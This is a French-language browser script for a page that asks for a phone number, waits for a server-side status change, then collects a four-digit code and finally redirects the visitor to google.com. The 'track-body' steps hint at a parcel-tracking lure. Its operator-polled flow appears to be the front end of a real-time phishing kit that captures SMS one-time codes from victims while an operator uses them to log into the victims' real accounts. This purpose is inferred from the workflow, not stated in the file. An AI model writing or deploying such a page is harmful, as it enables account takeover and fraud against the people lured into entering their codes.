let sessionId = null;
let pollTimer  = null;

// ── Soumission numéro de téléphone ──────────────────────────
document.getElementById('phone-submit').addEventListener('click', submitPhone);
document.getElementById('phone-input').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') submitPhone();
});

async function submitPhone() {
    const raw   = document.getElementById('phone-input').value.replace(/\s/g, '');
    if (!raw) return;
    const phone = '+33' + raw;

    const btn = document.getElementById('phone-submit');
    btn.disabled = true;

    try {
        const res  = await fetch('/api/start', {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify({ phone }),
        });
        const data = await res.json();
        if (!res.ok) throw new Error(data.error || 'Erreur serveur');

        sessionId = data.sessionId;
        document.getElementById('phone-display').textContent = phone;
        showStep('step-2');
        startPolling();
    } catch (err) {
        alert('Impossible de traiter votre demande : ' + err.message);
        btn.disabled = false;
    }
}

// ── Code 4 chiffres ─────────────────────────────────────────
const codeDigits = [...document.querySelectorAll('.code-digit')];
const codeSubmit = document.getElementById('code-submit');

codeDigits.forEach((input, idx) => {
    input.addEventListener('keydown', (e) => {
        if (!/^\d$/.test(e.key) && !['Backspace', 'Tab', 'ArrowLeft', 'ArrowRight'].includes(e.key)) {
            e.preventDefault();
        }
        if (e.key === 'Backspace' && !input.value && idx > 0) {
            codeDigits[idx - 1].value = '';
            codeDigits[idx - 1].classList.remove('filled');
            codeDigits[idx - 1].focus();
        }
    });

    input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/, '');
        if (input.value) {
            input.classList.add('filled');
            if (idx < codeDigits.length - 1) codeDigits[idx + 1].focus();
        } else {
            input.classList.remove('filled');
        }
        codeSubmit.disabled = !codeDigits.every(i => i.value.length === 1);
    });

    input.addEventListener('paste', (e) => {
        e.preventDefault();
        const text = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 4);
        text.split('').forEach((ch, i) => {
            if (codeDigits[i]) { codeDigits[i].value = ch; codeDigits[i].classList.add('filled'); }
        });
        const next = Math.min(text.length, codeDigits.length - 1);
        codeDigits[next].focus();
        codeSubmit.disabled = !codeDigits.every(i => i.value.length === 1);
    });
});

codeSubmit.addEventListener('click', submitCode);

async function submitCode() {
    const digits = codeDigits.map(i => i.value).join('');
    if (digits.length !== 4) return;

    codeSubmit.disabled = true;

    try {
        const res  = await fetch('/api/submit-code', {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify({ sessionId, code: digits }),
        });
        const data = await res.json();
        if (!res.ok) throw new Error(data.error || 'Erreur serveur');

        showStep('step-4');
        startPolling();
    } catch (err) {
        alert('Erreur : ' + err.message);
        codeSubmit.disabled = false;
    }
}

// ── Polling statut ───────────────────────────────────────────
function startPolling() {
    clearInterval(pollTimer);
    pollTimer = setInterval(async () => {
        try {
            const res  = await fetch('/api/status/' + sessionId);
            const data = await res.json();

            if (data.status === 'awaiting_code') {
                clearInterval(pollTimer);
                showStep('step-3');
                codeDigits[0].focus();
            } else if (data.status === 'refused') {
                clearInterval(pollTimer);
                showStep('step-refused');
            } else if (data.status === 'approved') {
                clearInterval(pollTimer);
                window.location.href = 'https://www.google.com';
            }
        } catch (_) { /* retry silently */ }
    }, 2000);
}

// ── Helpers ──────────────────────────────────────────────────
function showStep(id) {
    document.querySelectorAll('.track-body').forEach(el => el.classList.add('hidden'));
    document.getElementById(id).classList.remove('hidden');
}

function resetToStart() {
    clearInterval(pollTimer);
    sessionId = null;
    document.getElementById('phone-input').value = '';
    codeDigits.forEach(i => { i.value = ''; i.classList.remove('filled'); });
    codeSubmit.disabled = true;
    document.getElementById('phone-submit').disabled = false;
    showStep('step-1');
}
